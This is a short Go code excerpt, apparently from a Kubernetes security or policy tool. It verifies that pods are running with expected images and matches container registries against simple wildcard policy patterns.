// verifyPodsRunningWithImage checks if pods are running AND verifies their images match known patterns
func verifyPodsRunningWithImage(ctx context.Context, clientset kubernetes.Interface, namespaces []string, labelSelector string, controllerType string) (bool, string, bool) {
	// Use SDK-based verification for consistent detection across all modules
	podsRunning, runningNS, imageVerified, _, _ := VerifyPodsRunningWithSDK(ctx, clientset, namespaces, labelSelector, controllerType)
	return podsRunning, runningNS, imageVerified
}

// matchesPattern checks if a registry matches a policy pattern (simplified glob matching)
func matchesPattern(registry, pattern string) bool {
	if pattern == "*" || pattern == "**" {
		return true
	}
	if pattern == "" {
		return false
	}

	// Handle wildcards
	if strings.HasSuffix(pattern, "*") {
		prefix := strings.TrimSuffix(pattern, "*")
		return strings.HasPrefix(registry, prefix)
	}
	if strings.HasPrefix(pattern, "*") {
		suffix := strings.TrimPrefix(pattern, "*")
		return strings.HasSuffix(registry, suffix)
	}

	// Exact match
	return registry == pattern || strings.HasPrefix(registry, pattern+"/")
}
